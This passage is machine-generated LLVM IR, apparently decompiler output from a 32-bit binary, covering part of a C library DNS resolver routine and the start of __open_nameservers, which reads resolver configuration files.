  %v11_805666f = xor i32 %v4_805666f, %v3_805666f
  %v12_805666f = xor i32 %v5_805666f, %v3_805666f
  %v13_805666f = and i32 %v12_805666f, %v11_805666f
  %v14_805666f = icmp slt i32 %v13_805666f, 0
  %v16_805666f = icmp slt i32 %v5_805666f, 0
  %v2_8056673 = icmp eq i1 %v16_805666f, %v14_805666f
  br i1 %v2_8056673, label %dec_label_pc_805667b, label %dec_label_pc_8056675

dec_label_pc_8056675:                             ; preds = %dec_label_pc_8056637
  %v4_8056675 = add i32 %v3_805666f, 1
  store i32 %v4_8056675, i32* %v2_805666f, align 4
  br label %dec_label_pc_805669c.backedge

dec_label_pc_805667b:                             ; preds = %dec_label_pc_8056304, %dec_label_pc_8056637, %dec_label_pc_8056630, %dec_label_pc_805631b
  %v1_805668a = phi i32 [ %v1_805666c, %dec_label_pc_8056637 ], [ %v1_8056637, %dec_label_pc_8056630 ], [ %v1_8056357, %dec_label_pc_805631b ], [ %v0_805667b.pre, %dec_label_pc_8056304 ]
  %v1_805667b = add i32 %v1_805668a, 40
  %v2_805667b = inttoptr i32 %v1_805667b to i32*
  %v3_805667b = load i32, i32* %v2_805667b, align 4
  %v1_805667f = add i32 %v3_805667b, 1
  store i32 %v1_805667f, i32* %eax.global-to-local, align 4
  %v1_8056680 = ashr i32 %v1_805667f, 31
  store i32 %v1_8056680, i32* %edx.global-to-local, align 4
  %v1_8056681 = add i32 %v1_805668a, 248
  %v2_8056681 = inttoptr i32 %v1_8056681 to i32*
  %v3_8056681 = load i32, i32* %v2_8056681, align 4
  %v5_8056681 = zext i32 %v1_805667f to i64
  %v7_8056681 = zext i32 %v1_8056680 to i64
  %v8_8056681 = mul nuw i64 %v7_8056681, 4294967296
  %v9_8056681 = or i64 %v8_8056681, %v5_8056681
  %v10_8056681 = zext i32 %v3_8056681 to i64
  %v11_8056681 = sdiv i64 %v9_8056681, %v10_8056681
  %v12_8056681 = trunc i64 %v11_8056681 to i32
  store i32 %v12_8056681, i32* %eax.global-to-local, align 4
  %v13_8056681 = srem i64 %v9_8056681, %v10_8056681
  %v14_8056681 = trunc i64 %v13_8056681 to i32
  store i32 %v14_8056681, i32* %edx.global-to-local, align 4
  %v1_8056688 = icmp eq i32 %v14_8056681, 0
  store i32 %v14_8056681, i32* %v2_805667b, align 4
  %v1_805668e = icmp eq i1 %v1_8056688, false
  br i1 %v1_805668e, label %dec_label_pc_8056694, label %dec_label_pc_8056690

dec_label_pc_8056690:                             ; preds = %dec_label_pc_805667b
  %v0_8056690 = load i32, i32* @esp, align 4
  %v1_8056690 = add i32 %v0_8056690, 28
  %v2_8056690 = inttoptr i32 %v1_8056690 to i32*
  %v3_8056690 = load i32, i32* %v2_8056690, align 4
  %v4_8056690 = add i32 %v3_8056690, 1
  store i32 %v4_8056690, i32* %v2_8056690, align 4
  br label %dec_label_pc_8056694

dec_label_pc_8056694:                             ; preds = %dec_label_pc_805667b, %dec_label_pc_8056690
  %v0_8056694 = load i32, i32* @esp, align 4
  %v1_8056694 = add i32 %v0_8056694, 36
  %v2_8056694 = inttoptr i32 %v1_8056694 to i32*
  store i32 -1, i32* %v2_8056694, align 4
  br label %dec_label_pc_805669c.backedge

dec_label_pc_805669c.backedge:                    ; preds = %dec_label_pc_8056694, %dec_label_pc_8056312, %dec_label_pc_8056400, %dec_label_pc_8056675
  %v0_805669c.pre = load i32, i32* @esp, align 4
  %v1_805669c = add i32 %v0_805669c.pre, 28
  %v2_805669c = inttoptr i32 %v1_805669c to i32*
  %v3_805669c = load i32, i32* %v2_805669c, align 4
  %tmp110 = icmp ult i32 %v3_805669c, 3
  br i1 %tmp110, label %dec_label_pc_80560fc, label %dec_label_pc_80566c1

dec_label_pc_80566c1:                             ; preds = %dec_label_pc_8056076, %dec_label_pc_8056112, %dec_label_pc_8056206, %dec_label_pc_805669c.backedge, %entry, %dec_label_pc_8056050, %dec_label_pc_8056058, %dec_label_pc_8056066
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8056066 ], [ -1, %dec_label_pc_8056058 ], [ -1, %dec_label_pc_8056050 ], [ -1, %entry ], [ %v0_80560c3, %dec_label_pc_805669c.backedge ], [ %v0_80560c3, %dec_label_pc_8056206 ], [ %v0_80560c3, %dec_label_pc_8056112 ], [ %v0_80560c3, %dec_label_pc_8056076 ]
  %v0_80566c1 = call i32 @__GI___h_errno_location()
  store i32 %v0_80566c1, i32* %eax.global-to-local, align 4
  %v1_80566c6 = inttoptr i32 %v0_80566c1 to i32*
  store i32 -1, i32* %v1_80566c6, align 4
  %v0_80566cc = load i32, i32* @esp, align 4
  %v1_80566cc = add i32 %v0_80566cc, 56
  %v2_80566cc = inttoptr i32 %v1_80566cc to i32*
  %v3_80566cc = load i32, i32* %v2_80566cc, align 4
  store i32 %v3_80566cc, i32* %eax.global-to-local, align 4
  %v2_80566d0 = add i32 %v0_80566cc, 44
  %v3_80566d0 = inttoptr i32 %v2_80566d0 to i32*
  store i32 %v3_80566cc, i32* %v3_80566d0, align 4
  br label %dec_label_pc_80566d4

dec_label_pc_80566d4:                             ; preds = %dec_label_pc_8056439, %dec_label_pc_8056411, %dec_label_pc_80566c1
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_80566c1 ], [ %v0_80560c3, %dec_label_pc_8056439 ], [ %v0_80560c3, %dec_label_pc_8056411 ]
  %v0_80566d4 = load i32, i32* @esp, align 4
  %v1_80566d4 = add i32 %v0_80566d4, 20
  %v2_80566d4 = inttoptr i32 %v1_80566d4 to i32*
  %v3_80566d4 = load i32, i32* %v2_80566d4, align 4
  %v13_80566d4 = icmp eq i32 %v3_80566d4, -1
  br i1 %v13_80566d4, label %dec_label_pc_80566d4.dec_label_pc_80566ea_crit_edge, label %dec_label_pc_80566db

dec_label_pc_80566d4.dec_label_pc_80566ea_crit_edge: ; preds = %dec_label_pc_80566d4
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_80566ea

dec_label_pc_80566db:                             ; preds = %dec_label_pc_80566d4
  %v3_80566de = load i32, i32* %v2_80566d4, align 4
  %v5_80566de = add i32 %v0_80566d4, -16
  %v6_80566de = inttoptr i32 %v5_80566de to i32*
  store i32 %v3_80566de, i32* %v6_80566de, align 4
  %v1_80566e2 = sext i16 %stack_var_-180.1 to i32
  %v2_80566e2 = call i32 @__libc_close(i32 %v1_80566e2)
  store i32 %v2_80566e2, i32* %eax.global-to-local, align 4
  %v0_80566e7 = load i32, i32* @esp, align 4
  %v1_80566e7 = add i32 %v0_80566e7, 16
  br label %dec_label_pc_80566ea

dec_label_pc_80566ea:                             ; preds = %dec_label_pc_80566d4.dec_label_pc_80566ea_crit_edge, %dec_label_pc_80566db
  %v1_80566f1.pre-phi = phi i32 [ %.pre, %dec_label_pc_80566d4.dec_label_pc_80566ea_crit_edge ], [ %v1_80566e2, %dec_label_pc_80566db ]
  %v0_80566ea = phi i32 [ %v0_80566d4, %dec_label_pc_80566d4.dec_label_pc_80566ea_crit_edge ], [ %v1_80566e7, %dec_label_pc_80566db ]
  %v1_80566ed = add i32 %v0_80566ea, 12
  %v2_80566ed = inttoptr i32 %v1_80566ed to i32*
  %v3_80566ed = load i32, i32* %v2_80566ed, align 4
  %v5_80566ed = add i32 %v0_80566ea, -16
  %v6_80566ed = inttoptr i32 %v5_80566ed to i32*
  store i32 %v3_80566ed, i32* %v6_80566ed, align 4
  %v2_80566f1 = call i32 @free(i32 %v1_80566f1.pre-phi)
  store i32 %v2_80566f1, i32* %eax.global-to-local, align 4
  %v1_80566f6 = load i32, i32* @esp, align 4
  %v2_80566f6 = inttoptr i32 %v1_80566f6 to i32*
  store i32 %v2_805602e, i32* %v2_80566f6, align 4
  %v2_80566f9 = call i32 @free(i32 %v1_80566f1.pre-phi)
  store i32 %v2_80566f9, i32* @eax, align 4
  %v0_80566fe = load i32, i32* @esp, align 4
  %v1_8056701 = add i32 %v0_80566fe, 56
  %v2_8056701 = inttoptr i32 %v1_8056701 to i32*
  %v3_8056701 = load i32, i32* %v2_8056701, align 4
  %v13_8056701 = icmp eq i32 %v3_8056701, -1
  %v1_8056706 = add i32 %v0_80566fe, 32
  %v2_8056706 = inttoptr i32 %v1_8056706 to i32*
  store i32 -1, i32* %v2_8056706, align 4
  br i1 %v13_8056701, label %dec_label_pc_80566ea.dec_label_pc_805675d_crit_edge, label %dec_label_pc_8056710

dec_label_pc_80566ea.dec_label_pc_805675d_crit_edge: ; preds = %dec_label_pc_80566ea
  %v0_805675d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805675d

dec_label_pc_8056710:                             ; preds = %dec_label_pc_80566ea
  %v0_8056710 = load i32, i32* @ecx, align 4
  %v1_8056710 = load i32, i32* @esp, align 4
  %v2_8056710 = add i32 %v1_8056710, -4
  %v3_8056710 = inttoptr i32 %v2_8056710 to i32*
  store i32 %v0_8056710, i32* %v3_8056710, align 4
  %v1_8056711 = add i32 %v1_8056710, -8
  %v2_8056711 = inttoptr i32 %v1_8056711 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v2_8056711, align 4
  %v1_8056716 = add i32 %v1_8056710, -12
  %v2_8056716 = inttoptr i32 %v1_8056716 to i32*
  store i32 134565087, i32* %v2_8056716, align 4
  %v1_805671b = add i32 %v1_8056710, 184
  store i32 %v1_805671b, i32* %ebx.global-to-local, align 4
  %v2_8056722 = add i32 %v1_8056710, -16
  %v3_8056722 = inttoptr i32 %v2_8056722 to i32*
  store i32 %v1_805671b, i32* %v3_8056722, align 4
  %v3_8056723 = call i32 @__pthread_return_void(i32 %v1_80566f1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056723, i32* %eax.global-to-local, align 4
  %v0_8056728 = load i32, i32* @esp, align 4
  %v1_8056728 = inttoptr i32 %v0_8056728 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v1_8056728, align 4
  %v2_805672f = call i32 @__pthread_return_0(i32 %v1_80566f1.pre-phi)
  store i32 %v2_805672f, i32* %eax.global-to-local, align 4
  %v0_8056734 = load i32, i32* @esp, align 4
  %v1_8056734 = add i32 %v0_8056734, 60
  %v2_8056734 = inttoptr i32 %v1_8056734 to i32*
  %v3_8056734 = load i32, i32* %v2_8056734, align 4
  store i32 %v3_8056734, i32* %eax.global-to-local, align 4
  %v1_8056738 = add i32 %v0_8056734, 56
  %v2_8056738 = inttoptr i32 %v1_8056738 to i32*
  %v3_8056738 = load i32, i32* %v2_8056738, align 4
  store i32 %v3_8056738, i32* %edx.global-to-local, align 4
  %v1_805673c = trunc i32 %v3_8056734 to i16
  store i16 %v1_805673c, i16* @global_var_805b504.552, align 4
  %v1_8056742 = inttoptr i32 %v0_8056734 to i32*
  %v2_8056742 = load i32, i32* %v1_8056742, align 4
  store i32 %v2_8056742, i32* @eax, align 4
  %v3_8056742 = add i32 %v0_8056734, 4
  %v1_8056743 = sext i32 %v3_8056738 to i64
  store i64 %v1_8056743, i64* @global_var_80617c0.551, align 64
  %v1_8056749 = inttoptr i32 %v3_8056742 to i32*
  %v2_8056749 = load i32, i32* %v1_8056749, align 4
  store i32 %v2_8056749, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8056749, align 4
  %v0_805674c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805674c, i32* %v1_8056742, align 4
  %v3_805674d = call i32 @__pthread_return_void(i32 %v1_80566f1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805674d, i32* %eax.global-to-local, align 4
  %v0_8056752 = load i32, i32* @esp, align 4
  %v1_8056752 = add i32 %v0_8056752, 32
  %v2_8056752 = inttoptr i32 %v1_8056752 to i32*
  store i32 -1, i32* %v2_8056752, align 4
  br label %dec_label_pc_805675a

dec_label_pc_805675a:                             ; preds = %dec_label_pc_80565ce, %dec_label_pc_8056710
  %v0_805675a = load i32, i32* @esp, align 4
  %v1_805675a = add i32 %v0_805675a, 16
  br label %dec_label_pc_805675d

dec_label_pc_805675d:                             ; preds = %dec_label_pc_80566ea.dec_label_pc_805675d_crit_edge, %dec_label_pc_805675a
  %v0_805675d = phi i32 [ %v0_805675d.pre, %dec_label_pc_80566ea.dec_label_pc_805675d_crit_edge ], [ %v1_805675a, %dec_label_pc_805675a ]
  %v1_805675d = add i32 %v0_805675d, 16
  %v2_805675d = inttoptr i32 %v1_805675d to i32*
  %v3_805675d = load i32, i32* %v2_805675d, align 4
  store i32 %v3_805675d, i32* %eax.global-to-local, align 4
  %v1_8056761 = add i32 %v0_805675d, 220
  %v1_8056767 = inttoptr i32 %v1_8056761 to i32*
  %v2_8056767 = load i32, i32* %v1_8056767, align 4
  store i32 %v2_8056767, i32* @ebx, align 4
  %v3_8056767 = add i32 %v0_805675d, 224
  %v1_8056768 = inttoptr i32 %v3_8056767 to i32*
  %v2_8056768 = load i32, i32* %v1_8056768, align 4
  store i32 %v2_8056768, i32* @esi, align 4
  %v3_8056768 = add i32 %v0_805675d, 228
  %v1_8056769 = inttoptr i32 %v3_8056768 to i32*
  %v2_8056769 = load i32, i32* %v1_8056769, align 4
  store i32 %v2_8056769, i32* @edi, align 4
  %v3_8056769 = add i32 %v0_805675d, 232
  %v1_805676a = inttoptr i32 %v3_8056769 to i32*
  %v2_805676a = load i32, i32* %v1_805676a, align 4
  store i32 %v2_805676a, i32* @ebp, align 4
  ret i32 %v3_805675d

; uselistorder directives
  uselistorder i32 %v0_805675d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056734, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80566ea, { 1, 0 }
  uselistorder i32 %v1_80566f1.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_805669c.pre, { 1, 0 }
  uselistorder i32 %v5_805666f, { 1, 0 }
  uselistorder i32 %v3_805666f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8056637, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056600, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80565ce, { 1, 0 }
  uselistorder i32 %v3_80565ad, { 1, 0, 2 }
  uselistorder i32 %v0_805659e, { 1, 0 }
  uselistorder i32 %v5_8056594, { 1, 0 }
  uselistorder i32* %v3_8056594, { 1, 0 }
  uselistorder i32 %v0_805646a67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8056594, { 2, 1, 0 }
  uselistorder i32 %v5_805658e, { 1, 0 }
  uselistorder i32 %v1_805658d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8056589, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805654d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8056527, { 1, 0 }
  uselistorder i32 %v1_8056518, { 1, 0 }
  uselistorder i32 %v3_80564e9, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80564d7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805647e, { 1, 2, 0 }
  uselistorder i32 %v0_805647e, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8056458, { 1, 0 }
  uselistorder i32 %v0_8056460, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_805644e, { 1, 0, 2 }
  uselistorder i32 %v5_80563fa, { 1, 0 }
  uselistorder i32* %v2_80563fa, { 1, 0, 2 }
  uselistorder i32 %v3_80563b2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056398, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8056377, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8056357, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80562fd, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80562e2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80562cb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056253, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8056206, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80561e7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80561cb, { 1, 0 }
  uselistorder i32 %v3_80561c0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80561bd, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8056162, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_805615d, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8056146, { 1, 0 }
  uselistorder i32 %v1_8056112, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805610383, { 2, 1, 0 }
  uselistorder i16 %v0_80560c3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80560bc, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805602e, { 2, 11, 1, 6, 10, 9, 7, 5, 0, 3, 4, 8, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 3, 2, 4, 0 }
  uselistorder i32 68, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 17, 14, 6, 13, 3, 4, 2, 7, 8, 9, 10, 1, 18, 5, 15, 16, 11, 12, 0 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 1, 3, 4, 2, 0 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 17, 16, 15, 18, 22, 21, 20, 13, 19, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805b504.552, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_80617c0.551, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80617a8.550 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80617a8.550, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 10, 3, 11, 12, 4, 5, 0, 1, 2, 7, 8, 9, 6 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805675d, { 1, 0 }
  uselistorder label %dec_label_pc_805675a, { 1, 0 }
  uselistorder label %dec_label_pc_80566ea, { 1, 0 }
  uselistorder label %dec_label_pc_80566d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80566c1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_805669c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056694, { 1, 0 }
  uselistorder label %dec_label_pc_805667b, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056630, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80565ce, { 1, 0 }
  uselistorder label %dec_label_pc_805659e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056594, { 1, 0 }
  uselistorder label %dec_label_pc_8056589, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056586, { 1, 0 }
  uselistorder label %dec_label_pc_8056501, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056458, { 1, 0 }
  uselistorder label %dec_label_pc_80562cb, { 1, 0 }
  uselistorder label %dec_label_pc_8056294, { 1, 0 }
  uselistorder label %dec_label_pc_8056206, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056112, { 1, 0 }
  uselistorder label %dec_label_pc_80560fc, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_805676c = load i32, i32* @ebp, align 4
  store i32 134565087, i32* %stack_var_-216, align 4
  %v3_805677b = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056780 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056780, i32* @eax, align 4
  %v2_8056788 = call i32 @__pthread_return_void(i32 %v2_8056780, i32 134565087)
  %v1_8056794 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b508.489 to i32))
  store i32 %v1_8056794, i32* @eax, align 4
  %v0_805679c = load i32, i32* @global_var_8061bf4.490, align 4
  %tmp41 = icmp slt i32 %v0_805679c, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8056993, label %dec_label_pc_80567a9

dec_label_pc_80567a9:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805af90.555 to i32), i32* %stack_var_-216, align 4
  %v2_80567b5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805af5e.556 to i32), i32 ptrtoint (i32* @global_var_805af90.555 to i32))
  store i32 %v2_80567b5, i32* @eax, align 4
  %v1_80567bd = icmp eq i32 %v2_80567b5, 0
  store i32 %v2_80567b5, i32* @ebp, align 4
  %v1_80567c1 = icmp eq i1 %v1_80567bd, false
  br i1 %v1_80567c1, label %dec_label_pc_805695e.preheader, label %dec_label_pc_80567c7

dec_label_pc_80567c7:                             ; preds = %dec_label_pc_80567a9
  store i32 ptrtoint (i32* @global_var_805af90.555 to i32), i32* %stack_var_-216, align 4
  %v2_80567d3 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805af6f.557 to i32), i32 ptrtoint (i32* @global_var_805af90.555 to i32))
  %v1_80567db = icmp eq i32 %v2_80567d3, 0
  store i32 %v2_80567d3, i32* @ebp, align 4
  %v1_80567df = icmp eq i1 %v1_80567db, false
  br i1 %v1_80567df, label %dec_label_pc_805695e.preheader, label %dec_label_pc_8056988

dec_label_pc_805695e.preheader:                   ; preds = %dec_label_pc_80567a9, %dec_label_pc_80567c7
  %v2_8056965 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8056899 = add i32 %v3_805677b, 164
  %v4_8056888 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805695e

dec_label_pc_80567ea:                             ; preds = %dec_label_pc_80567f5
  %v1_80567ea = add i32 %v0_80567ea56, 1
  store i32 %v1_80567ea, i32* @ebx, align 4
  %v1_80567eb = inttoptr i32 %v1_80567ea to i8*
  %v2_80567eb = load i8, i8* %v1_80567eb, align 1
  %v3_80567eb = zext i8 %v2_80567eb to i32
  %v5_80567eb = and i32 %v6_80567eb59, -256
  %v6_80567eb = or i32 %v3_80567eb, %v5_80567eb
  store i32 %v6_80567eb, i32* @ecx, align 4
  %v4_80567ed = icmp eq i8 %v2_80567eb, 0
  br i1 %v4_80567ed, label %dec_label_pc_805695e, label %dec_label_pc_80567f5

dec_label_pc_80567f5:                             ; preds = %dec_label_pc_80567f5.lr.ph, %dec_label_pc_80567ea
  %v6_80567eb59 = phi i32 [ %v6_80567eb53, %dec_label_pc_80567f5.lr.ph ], [ %v6_80567eb, %dec_label_pc_80567ea ]
  %v2_80567eb58 = phi i8 [ %v2_80567eb50, %dec_label_pc_80567f5.lr.ph ], [ %v2_80567eb, %dec_label_pc_80567ea ]
  %v1_80567eb57 = phi i8* [ %v1_80567eb49, %dec_label_pc_80567f5.lr.ph ], [ %v1_80567eb, %dec_label_pc_80567ea ]
  %v0_80567ea56 = phi i32 [ %v0_80567eb.pre, %dec_label_pc_80567f5.lr.ph ], [ %v1_80567ea, %dec_label_pc_80567ea ]
  store i32 %v0_80567f5.pre, i32* @eax, align 4
  %v2_80567fa = sext i8 %v2_80567eb58 to i32
  store i32 %v2_80567fa, i32* @edx, align 4
  %v2_80567fd = mul nsw i32 %v2_80567fa, 2
  %v3_80567fd = add i32 %v0_80567f5.pre, %v2_80567fd
  %v4_80567fd = inttoptr i32 %v3_80567fd to i8*
  %v5_80567fd = load i8, i8* %v4_80567fd, align 1
  %v6_80567fd = and i8 %v5_80567fd, 32
  %v7_80567fd = icmp eq i8 %v6_80567fd, 0
  %v1_8056801 = icmp eq i1 %v7_80567fd, false
  br i1 %v1_8056801, label %dec_label_pc_80567ea, label %dec_label_pc_8056803

dec_label_pc_8056803:                             ; preds = %dec_label_pc_80567f5
  %v10_8056803 = icmp eq i8 %v2_80567eb58, 10
  br i1 %v10_8056803, label %dec_label_pc_805695e, label %dec_label_pc_805680c

dec_label_pc_805680c:                             ; preds = %dec_label_pc_8056803
  %v10_805680c = icmp eq i8 %v2_80567eb58, 35
  %v1_8056817 = icmp eq i1 %v10_805680c, false
  br i1 %v1_8056817, label %dec_label_pc_8056868.preheader, label %dec_label_pc_805695e

dec_label_pc_8056868.preheader:                   ; preds = %dec_label_pc_805680c
  %v2_80568686 = load i8, i8* %v1_80567eb57, align 1
  %v3_80568687 = icmp eq i8 %v2_80568686, 0
  br i1 %v3_80568687, label %dec_label_pc_8056874, label %dec_label_pc_805686d

dec_label_pc_805681e:                             ; preds = %dec_label_pc_805686d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8056822 = load i32, i32* @esp, align 4
  %v3_8056822 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8056822 = add nuw nsw i32 %v3_8056822, 152
  %v5_8056822 = add i32 %v4_8056822, %v1_8056822
  %v6_8056822 = inttoptr i32 %v5_8056822 to i32*
  store i32 %v0_8056822, i32* %v6_8056822, align 4
  %v0_805682c.pre = load i32, i32* @ebx, align 4
  %v4_805682c.pre = load i32, i32* @ecx, align 4
  %v1_805682c60 = inttoptr i32 %v0_805682c.pre to i8*
  %v2_805682c61 = load i8, i8* %v1_805682c60, align 1
  %v3_805682c62 = zext i8 %v2_805682c61 to i32
  %v5_805682c63 = and i32 %v4_805682c.pre, -256
  %v6_805682c64 = or i32 %v3_805682c62, %v5_805682c63
  %v4_805682e65 = icmp eq i8 %v2_805682c61, 0
  br i1 %v4_805682e65, label %dec_label_pc_805684b.preheader, label %dec_label_pc_8056832.lr.ph

dec_label_pc_8056832.lr.ph:                       ; preds = %dec_label_pc_805681e
  %v0_8056832.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8056832

dec_label_pc_805682b:                             ; preds = %dec_label_pc_8056840
  %v1_805682b = add i32 %v0_805682b67, 1
  store i32 %v1_805682b, i32* @ebx, align 4
  %v1_805682c = inttoptr i32 %v1_805682b to i8*
